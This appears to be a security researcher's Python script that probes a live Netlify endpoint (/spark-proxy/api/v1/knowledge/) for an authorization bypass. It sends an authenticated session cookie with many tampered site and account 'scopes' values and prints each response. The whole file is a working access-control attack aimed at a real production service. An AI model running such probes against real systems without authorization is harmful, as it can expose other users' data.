# -*- coding: utf-8 -*-
"""Netlify:spark-proxy knowledge 越权变体测试"""
import http.client, ssl, gzip, brotli, sys, json, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ACC_ID = '6a979dd2ae93f47d55b62897'
ctx = ssl.create_default_context()

def req(path, method='GET', body=None, headers=None):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json'}
    if body is not None:
        h['Content-Type'] = 'application/json'
        body = json.dumps(body).encode()
    if headers:
        h.update(headers)
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

scopes_variants = [
    ('不存在siteId+自己acc', {'siteId': '00000000-0000-0000-0000-000000000000', 'accountId': ACC_ID}),
    ('自己siteId+不存在acc', {'siteId': SITE_ID, 'accountId': '00000000-0000-0000-0000-000000000000'}),
    ('空对象', {}),
    ('null', None),
    ('数组', ['site']),
    ('字符串', 'site'),
    ('自己siteId+数字acc', {'siteId': SITE_ID, 'accountId': '1643584176'}),
    ('自己siteId+slug acc', {'siteId': SITE_ID, 'accountId': '1643584176'}),
    ('仅siteId(自己的)', {'siteId': SITE_ID}),
    ('两个siteId', {'siteId': SITE_ID, 'accountId': ACC_ID, 'extra': 'x'}),
]
for label, sc in scopes_variants:
    if sc is None:
        q = ''
    else:
        q = '?scopes=' + urllib.parse.quote(json.dumps(sc))
    try:
        s, raw = req('/spark-proxy/api/v1/knowledge/' + q, headers={'Cookie': COOKIE_NET})
        print('%-28s %d %s' % (label, s, raw[:120].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-28s ERR %s' % (label, str(e)[:40]))
